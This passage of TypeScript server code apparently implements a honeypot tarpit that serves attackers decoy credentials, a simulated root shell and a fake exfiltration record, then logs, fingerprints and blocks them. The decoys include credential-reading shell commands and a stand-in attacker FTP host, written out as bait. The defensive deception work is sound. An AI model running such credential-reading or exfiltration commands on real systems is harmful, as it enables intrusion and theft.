        total: 247, session: sessionId, next_page: nextStep,
      }};

    case 4: // Server credentials — fake SSH keys, API keys, env vars
      return { contentType: "text/plain", body: [
        "# Production Server Credentials — CONFIDENTIAL",
        "# Generated: " + new Date().toISOString(),
        `DB_HOST=prod-db-01.corp.internal:5432`,
        `DB_USER=app_prod`, `DB_PASS=Pr0d_S3cr3t_2024!GhostTrap`,
        `DB_NAME=app_production`,
        `STRIPE_SECRET=sk_live_GHOSTTRAP_FAKE_${sessionId.slice(0,8)}`,
        `AWS_ACCESS_KEY_ID=AKIA_GHOSTTRAP_${sessionId.slice(0,12).toUpperCase()}`,
        `AWS_SECRET=GhostTrapFakeAWSSecret+${sessionId.slice(0,16)}`,
        `JWT_SECRET=GhostTrapFakeJWTSecret_${sessionId}`,
        `SSH_KEY_PASSPHRASE=Ssh_Pr0d_2024!`,
        `-----BEGIN RSA PRIVATE KEY-----`,
        `MIIEowIBAAKCAQEA${Buffer.from("GHOSTTRAP_FAKE_KEY_"+sessionId).toString("base64")}`,
        `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`,
        `-----END RSA PRIVATE KEY-----`,
        `MONITORING_URL=${pixelUrl}`,
        `ANALYTICS_HOOK=${nextStep}`,
      ].join("\n") };

    case 5: // Deeper access — fake root shell simulation
      return { contentType: "application/json", body: {
        shell: "bash", user: "root", hostname: "prod-01",
        cwd: "/var/www/app",
        history: [
          `$ id\nuid=0(root) gid=0(root) groups=0(root)`,
          `$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\n...${loopCount} more lines`,
          `$ ls -la /home\ndrwxr-xr-x admin jsmith mwilliams devops`,
          `$ cat /root/.ssh/authorized_keys\n${pixelUrl} root@monitoring`,
          `$ curl ${nextStep}\n{"status":"ok","session":"${sessionId}"}`,
        ],
        env: { TERM: "xterm-256color", SHELL: "/bin/bash", SESSION: sessionId },
        next: nextStep, beacon: pixelUrl,
      }};

    case 6: // Exfil complete — fake "upload finished" then loop back
      return { contentType: "application/json", body: {
        exfil: true, status: "complete",
        files_transferred: Math.floor(Math.random()*150+50),
        bytes_transferred: Math.floor(Math.random()*50000000+10000000),
        destination: `ftp://upload.attacker-c2.xyz/stolen_data_${sessionId.slice(0,8)}`,
        checksum: crypto.randomBytes(16).toString("hex"),
        note: "Session will re-authenticate to continue. Use your token.",
        session_expired: true,
        re_authenticate: `${beaconBase}/lure/login`,  // loops them back to start
        beacon_confirm: pixelUrl,
      }};

    default:
      return { contentType: "application/json", body: { ok: true, session: sessionId } };
  }
}

// POST /engage — start an infinite tarpit loop session for an IP (auth required)
router.post("/engage", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const body = req.body as { ip: string; triggerType?: string; initialPayload?: string };
  const ip = String(body.ip ?? "").trim();
  if (!ip) { res.status(400).json({ error: "ip required" }); return; }

  const sessionId = crypto.randomUUID();
  const fakeUser  = FAKE_USERNAMES[Math.floor(Math.random() * FAKE_USERNAMES.length)]!;

  const [session] = await db.insert(ghostTrapLoopSessionsTable).values({
    sessionId, attackerIp: ip,
    stage: 0, stageLabel: "initial_contact",
    loopCount: 0, interactionCount: 0, totalTarpitMs: 0,
    triggerType: String(body.triggerType ?? "manual"),
    initialPayload: body.initialPayload ? String(body.initialPayload).substring(0, 2000) : null,
    fakeSessionToken: sessionId, fakeUsername: fakeUser,
    isActive: true,
  }).returning();

  // Also create a connection queue entry so admin can see it
  await db.insert(firewallConnectionQueueTable).values({
    ip, detectedFrom: "ghosttrap",
    attackType: String(body.triggerType ?? "manual"),
    anomalyScore: 80, reason: "GhostTrap loop engaged",
    status: "trapped",
    expiresAt: new Date(Date.now() + 24 * 60 * 60 * 1000),
  }).catch(() => {});

  const proto = req.headers["x-forwarded-proto"] ?? "https";
  const host  = req.headers["x-forwarded-host"] ?? req.headers.host ?? "";
  const beaconBase = `${proto}://${host}/api/ghost-trap`;

  res.json({
    sessionId,
    loopUrl: `${beaconBase}/loop/${sessionId}`,
    fakeUser,
    stage: session.stage,
    message: "Tarpit loop engaged. Share the loopUrl in fake responses to trap the attacker.",
  });
});

// POST /loop/:sessionId — PUBLIC endpoint. Attackers hit this thinking it's a real API.
// Each call advances the stage and returns convincing fake data.
router.all("/loop/:sessionId", async (req, res) => {
  const { sessionId } = req.params;
  const ip = getIp(req);

  const rows = await db.select().from(ghostTrapLoopSessionsTable)
    .where(eq(ghostTrapLoopSessionsTable.sessionId, String(sessionId))).limit(1);

  let session = rows[0];
  const isNewSession = !session;

  if (!session) {
    // Unknown session → create a new one automatically (catch any scanner that guesses IDs)
    const fakeUser = FAKE_USERNAMES[Math.floor(Math.random() * FAKE_USERNAMES.length)]!;
    const [created] = await db.insert(ghostTrapLoopSessionsTable).values({
      sessionId: String(sessionId), attackerIp: ip, stage: 0,
      stageLabel: "initial_contact", loopCount: 0, interactionCount: 0,
      totalTarpitMs: 0, triggerType: "unknown", fakeUsername: fakeUser,
      fakeSessionToken: String(sessionId), isActive: true,
    }).returning().catch(() => []);
    if (!created) { res.status(404).json({ error: "Not found" }); return; }
    session = created;
  }

  if (!session.isActive) {
    res.status(410).json({ error: "Session expired" });
    return;
  }

  const currentStage = session.stage % 7;
  const stageDef = LOOP_STAGES[currentStage] ?? LOOP_STAGES[0]!;
  const tarpitMs = stageDef.tarpitMin + Math.floor(Math.random() * (stageDef.tarpitMax - stageDef.tarpitMin));

  // Tarpit delay — waste attacker's time
  await tarpit(tarpitMs);

  const proto = req.headers["x-forwarded-proto"] ?? "https";
  const host  = req.headers["x-forwarded-host"] ?? req.headers.host ?? "";
  const beaconBase = `${proto}://${host}/api/ghost-trap`;

  const response = buildLoopStageResponse(
    currentStage, session.sessionId, session.fakeUsername ?? "admin",
    beaconBase, session.loopCount
  );

  // Advance to next stage, wrap at 7
  const nextStage = (currentStage + 1) % 7;
  const nextLabel = LOOP_STAGES[nextStage]?.label ?? "login_success";
  const newLoopCount = nextStage === 1 ? session.loopCount + 1 : session.loopCount;

  // Accumulate intelligence from request
  const rawPayload = JSON.stringify({ query: req.query, body: req.body, path: req.path }).substring(0, 2000);
  const prevIntel = session.intelligenceJson ? JSON.parse(session.intelligenceJson) : {};
  const newIntel = {
    ...prevIntel,
    payloads: [...(prevIntel.payloads ?? []).slice(-10), rawPayload.substring(0, 200)],
    stages_visited: [...(prevIntel.stages_visited ?? []), stageDef.label],
    total_tarpit_ms: (prevIntel.total_tarpit_ms ?? 0) + tarpitMs,
    last_ua: (req.headers["user-agent"] ?? "").substring(0, 256),
    last_seen: new Date().toISOString(),
    loop_count: newLoopCount,
    ip_confirmed: ip,
  };

  await db.update(ghostTrapLoopSessionsTable).set({
    stage: nextStage, stageLabel: nextLabel, loopCount: newLoopCount,
    interactionCount: session.interactionCount + 1,
    totalTarpitMs: session.totalTarpitMs + tarpitMs,
    intelligenceJson: JSON.stringify(newIntel),
    lastStageResponse: JSON.stringify(response.body).substring(0, 2000),
    lastSeenAt: new Date(),
    attackerIp: ip, // update in case they're behind a proxy and IP changes
  }).where(eq(ghostTrapLoopSessionsTable.sessionId, session.sessionId)).catch(() => {});

  // Auto-block after 10 loop interactions
  if (session.interactionCount >= 10) {
    const alreadyBlocked = await db.select().from(blockedIpsTable).where(eq(blockedIpsTable.ip, ip)).limit(1);
    if (!alreadyBlocked.length) {
      await db.insert(blockedIpsTable).values({
        ip, reason: `GhostTrap loop: ${session.interactionCount + 1} interactions (${session.triggerType})`,
        autoBlocked: true,
      }).catch(() => {});
    }
  }

  // Auto SilkWeb trap after 3 interactions
  if (session.interactionCount >= 3 && !session.silkTrapped) {
    const webRows = await db.select().from(silkWebTable).limit(1);
    if (webRows.length) {
      await db.insert(trappedAttackersTable).values({
        ip, fingerprint: `LOOP|${session.sessionId}|STAGE:${currentStage}|LOOPS:${newLoopCount}`,
        entryNodeId: 1, honeypotPort: 443,
        probeType: `loop_trap_${session.triggerType}`,
        dataCollected: JSON.stringify({ sessionId: session.sessionId, interactionCount: session.interactionCount, loopCount: newLoopCount }),
        sqlmapStatus: "idle",
      }).catch(() => {});
      await db.update(ghostTrapLoopSessionsTable).set({ silkTrapped: true })
        .where(eq(ghostTrapLoopSessionsTable.sessionId, session.sessionId)).catch(() => {});
    }
  }

  // Respond with fake Apache headers
  res.setHeader("X-Powered-By", "Apache/2.4.54");
  res.setHeader("Server", "Apache/2.4.54 (Ubuntu)");
  res.setHeader("X-Session", session.sessionId);
  res.setHeader("Content-Type", response.contentType);
  if (typeof response.body === "string") res.status(200).send(response.body);
  else res.status(200).json(response.body);
});

// GET /sessions — list active tarpit loop sessions (auth required)
router.get("/sessions", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const limit = Math.min(Number(req.query.limit ?? 100), 500);
  const sessions = await db.select().from(ghostTrapLoopSessionsTable)
    .orderBy(desc(ghostTrapLoopSessionsTable.lastSeenAt)).limit(limit);

  const [stats] = await db.select({
    total:    sql<number>`count(*)::int`,
    active:   sql<number>`count(*) filter (where is_active = true)::int`,
    loops:    sql<number>`sum(loop_count)::int`,
    blocked:  sql<number>`count(*) filter (where auto_block_scheduled = true)::int`,
    silkTrapped: sql<number>`count(*) filter (where silk_trapped = true)::int`,
    avgInteractions: sql<number>`avg(interaction_count)::int`,
  }).from(ghostTrapLoopSessionsTable);

  res.json({ sessions, stats });
});

// GET /sessions/:sessionId — session detail (auth required)
router.get("/sessions/:sessionId", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const rows = await db.select().from(ghostTrapLoopSessionsTable)
    .where(eq(ghostTrapLoopSessionsTable.sessionId, String(req.params.sessionId))).limit(1);
  if (!rows.length) { res.status(404).json({ error: "Session not found" }); return; }
  res.json(rows[0]);
});

// DELETE /sessions/:sessionId — terminate a tarpit session and block the attacker
router.delete("/sessions/:sessionId", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const rows = await db.select().from(ghostTrapLoopSessionsTable)
    .where(eq(ghostTrapLoopSessionsTable.sessionId, String(req.params.sessionId))).limit(1);
  if (!rows.length) { res.status(404).json({ error: "Session not found" }); return; }

  const session = rows[0]!;
  await db.update(ghostTrapLoopSessionsTable).set({ isActive: false })
    .where(eq(ghostTrapLoopSessionsTable.sessionId, session.sessionId));

  const action = (req.query.action ?? "block") as string;
  if (action === "block") {
    const alreadyBlocked = await db.select().from(blockedIpsTable)
      .where(eq(blockedIpsTable.ip, session.attackerIp)).limit(1);
    if (!alreadyBlocked.length) {
      await db.insert(blockedIpsTable).values({
        ip: session.attackerIp,
        reason: `GhostTrap loop terminated: ${session.interactionCount} interactions, ${session.loopCount} loops`,
        autoBlocked: false,
      }).catch(() => {});
    }
  }
  res.json({ ok: true, action, session });
});

// ═══════════════════════════════════════════════════════════════════════════════
// DEFENSIVE GHOST TRAP — Events, Evidence, Block-Source (Phase 1 additions)
// ═══════════════════════════════════════════════════════════════════════════════

// GET /events — unified Ghost Trap event timeline (auth required)
router.get("/events", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const limit  = Math.min(Number(req.query.limit ?? 100), 500);
  const events = await db
    .select()
    .from(ghostTrapEventsTable)
    .where(eq(ghostTrapEventsTable.userId, userId))
    .orderBy(desc(ghostTrapEventsTable.createdAt))
    .limit(limit);

  const [stats] = await db.select({
    total:    sql<number>`count(*)::int`,
    high:     sql<number>`count(*) filter (where severity = 'high')::int`,
    critical: sql<number>`count(*) filter (where severity = 'critical')::int`,
    blocks:   sql<number>`count(*) filter (where event_type = 'block')::int`,
    exports:  sql<number>`count(*) filter (where event_type = 'evidence_export')::int`,
  }).from(ghostTrapEventsTable).where(eq(ghostTrapEventsTable.userId, userId));

  res.json({ events, stats });
});

// GET /evidence — list exported evidence bundles (auth required)
router.get("/evidence", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const limit = Math.min(Number(req.query.limit ?? 50), 200);
  const bundles = await db
    .select({
      evidenceId:   ghostTrapEvidenceTable.evidenceId,
      subjectIp:    ghostTrapEvidenceTable.subjectIp,
      evidenceType: ghostTrapEvidenceTable.evidenceType,
      format:       ghostTrapEvidenceTable.format,
      probeCount:   ghostTrapEvidenceTable.probeCount,
      sessionCount: ghostTrapEvidenceTable.sessionCount,
      sha256:       ghostTrapEvidenceTable.sha256,
      notes:        ghostTrapEvidenceTable.notes,
      exportedAt:   ghostTrapEvidenceTable.exportedAt,
    })
    .from(ghostTrapEvidenceTable)
    .where(eq(ghostTrapEvidenceTable.userId, userId))
    .orderBy(desc(ghostTrapEvidenceTable.exportedAt))
    .limit(limit);

  res.json({ bundles, total: bundles.length });
});

// GET /evidence/:id — download single evidence bundle (auth required)
router.get("/evidence/:evidenceId", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const [row] = await db
    .select()
    .from(ghostTrapEvidenceTable)
    .where(eq(ghostTrapEvidenceTable.evidenceId, String(req.params.evidenceId)))
    .limit(1);

  if (!row || row.userId !== userId) { res.status(404).json({ error: "Evidence bundle not found" }); return; }

  if (req.query.download === "1") {
    res.setHeader("Content-Disposition", `attachment; filename="evidence-${row.evidenceId}.json"`);
    res.setHeader("Content-Type", "application/json");
    res.send(row.bundleJson ?? "{}");
    return;
  }
  res.json(row);
});

// POST /export-evidence — generate a signed evidence bundle for an attacker IP (auth required)
router.post("/export-evidence", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip, notes } = req.body as { ip?: string; notes?: string };
  if (!ip) { res.status(400).json({ error: "ip is required" }); return; }

  // Verify the IP actually probed this user's Ghost Trap
  const probeCheck = await db
    .select({ id: ghostTrapProbesTable.id })
    .from(ghostTrapProbesTable)
    .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
    .limit(1);
  if (!probeCheck.length) {
    res.status(403).json({ error: "IP not in your Ghost Trap probe log — cannot export evidence for unknown sources." });
    return;
  }

  // Build evidence bundle
  const probes   = await db.select().from(ghostTrapProbesTable)
    .where(eq(ghostTrapProbesTable.attackerIp, ip))
    .orderBy(desc(ghostTrapProbesTable.probedAt)).limit(500);
  const sessions = await db.select().from(ghostTrapLoopSessionsTable)
    .where(eq(ghostTrapLoopSessionsTable.attackerIp, ip))
    .orderBy(desc(ghostTrapLoopSessionsTable.createdAt)).limit(100);
  const beaconRows = await db.select().from(ghostTrapBeaconsTable)
    .where(eq(ghostTrapBeaconsTable.attackerIp, ip))
    .orderBy(desc(ghostTrapBeaconsTable.firedAt)).limit(100);

  const bundle = {
    exportedAt: new Date().toISOString(), exportedBy: userId, subjectIp: ip,
    platform: "ProxhqVPN Ghost Trap — Alpha Unlimited Technologies LLC",
    defensiveModeOnly: true,
    probeCount: probes.length, sessionCount: sessions.length, beaconCount: beaconRows.length,
    probes: probes.map(p => ({
      probeId: p.probeId, method: p.method, endpoint: p.endpoint,
      probeType: p.probeType, attackVector: p.attackVector,
      tarpitMs: p.tarpitMs, autoBlocked: p.autoBlocked,
      vpnDetected: p.vpnDetected, torDetected: p.torDetected,
      geoCountry: p.geoCountry, geoCity: p.geoCity,
      geoIsp: p.geoIsp, geoAsn: p.geoAsn, probedAt: p.probedAt,
    })),
    sessions: sessions.map(s => ({
      sessionId: s.sessionId, stage: s.stageLabel,
      loopCount: s.loopCount, totalTarpitMs: s.totalTarpitMs,
      isActive: s.isActive, createdAt: s.createdAt, lastSeenAt: s.lastSeenAt,
    })),
    beacons: beaconRows.map(b => ({
      beaconId: b.beaconId, firedAt: b.firedAt,
      firedFromIp: b.firedFromIp, firedUa: b.firedUa,
      timezone: b.timezone, screenSize: b.screenSize,
    })),
    notes: notes ?? null,
  };

  const bundleJson = JSON.stringify(bundle, null, 2);
  const sha256     = crypto.createHash("sha256").update(bundleJson).digest("hex");
  const evidenceId = `EVD-${crypto.randomBytes(8).toString("hex").toUpperCase()}`;

  const [row] = await db.insert(ghostTrapEvidenceTable).values({
    evidenceId, userId, subjectIp: ip,
    evidenceType: "full_bundle", format: "json",
    bundleJson, probeCount: probes.length, sessionCount: sessions.length,
    sha256, notes: notes ?? null,
  }).returning();

  // Audit event
  await db.insert(ghostTrapEventsTable).values({
    eventId:   `GTE-${crypto.randomBytes(8).toString("hex").toUpperCase()}`,
    userId,
    eventType: "evidence_export",
    severity:  "info",
    sourceIp:  ip,
    summary:   `Evidence bundle exported for ${ip} (${probes.length} probes, ${sessions.length} sessions)`,
    detailJson: JSON.stringify({ evidenceId, sha256 }),
  }).catch(() => {});

  appendAuditEvent({ action: "evidence_export", actor: userId ?? "system", resource: `ghost_trap:${evidenceId}`, metadata: { ip, sha256 } });

  res.json({ ok: true, evidenceId, sha256, probeCount: probes.length, sessionCount: sessions.length });
});

// POST /block-source — block an attacker IP (auth required)
router.post("/block-source", requireRbac("counter_attack"), async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const { ip, cidr, reason = "manual", permanent = false, expiresInHours, notes, probeId, sessionId } = req.body as {
    ip?: string; cidr?: string; reason?: string; permanent?: boolean;
    expiresInHours?: number; notes?: string; probeId?: string; sessionId?: string;
  };

  if (!ip && !cidr) { res.status(400).json({ error: "ip or cidr is required" }); return; }

  // Validate: if IP provided, verify it's in the probe log
  if (ip) {
    if (!/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) { res.status(400).json({ error: "Invalid IP format" }); return; }
    const probeCheck = await db.select({ id: ghostTrapProbesTable.id })
      .from(ghostTrapProbesTable)
      .where(and(eq(ghostTrapProbesTable.attackerIp, ip), eq(ghostTrapProbesTable.userId, userId)))
      .limit(1);
    if (!probeCheck.length) {
      res.status(403).json({ error: "IP not in your Ghost Trap probe log" });
      return;
    }
  }

  const expiresAt = (!permanent && expiresInHours)
    ? new Date(Date.now() + expiresInHours * 3600_000)
    : null;

  const [row] = await db.insert(ghostBlockedSourcesTable).values({
    blockedBy:  userId,
    sourceIp:   ip   ?? null,
    sourceCidr: cidr ?? null,
    reason,
    probeId:    probeId   ?? null,
    sessionId:  sessionId ?? null,
    severity:   "high",
    permanent:  !!permanent,
    expiresAt:  expiresAt ?? undefined,
    notes:      notes ?? null,
  }).returning();

  // Also add to legacy blockedIpsTable for immediate effect
  if (ip) {
    await db.insert(blockedIpsTable).values({ ip, reason: `Ghost Trap block: ${reason}`, autoBlocked: false })
      .onConflictDoNothing()
      .catch(() => {});
  }

  // Audit event
  await db.insert(ghostTrapEventsTable).values({
    eventId:   `GTE-${crypto.randomBytes(8).toString("hex").toUpperCase()}`,
    userId,
    eventType: "block",
    severity:  "high",
    sourceIp:  ip ?? cidr,
    summary:   `Source blocked: ${ip ?? cidr} (${reason})`,
    detailJson: JSON.stringify({ ip, cidr, permanent, expiresAt }),
  }).catch(() => {});

  appendAuditEvent({ action: "block_source", actor: userId ?? "system", resource: `ghost_trap:${ip ?? cidr ?? "unknown"}`, metadata: { reason, permanent } });
  void shipSecurityEvent({
    actor: userId ?? "system",
    action: "ghost_trap.block_source",
    resource: `ghost_trap:${ip ?? cidr ?? "unknown"}`,
    result: "deny",
    metadata: { ip, cidr, reason, permanent },
  });

  res.json({ ok: true, blocked: row });
});

// GET /blocked-sources — list blocked sources (auth required)
router.get("/blocked-sources", async (req, res) => {
  const userId = ((req as any).auth)?.userId as string | undefined;
  if (!userId) { res.status(401).json({ error: "Unauthorized" }); return; }

  const rows = await db
    .select()
    .from(ghostBlockedSourcesTable)
    .where(and(eq(ghostBlockedSourcesTable.blockedBy, userId), eq(ghostBlockedSourcesTable.active, true)))
    .orderBy(desc(ghostBlockedSourcesTable.createdAt))
    .limit(200);

  res.json({ blocked: rows, total: rows.length });
});

export default router;
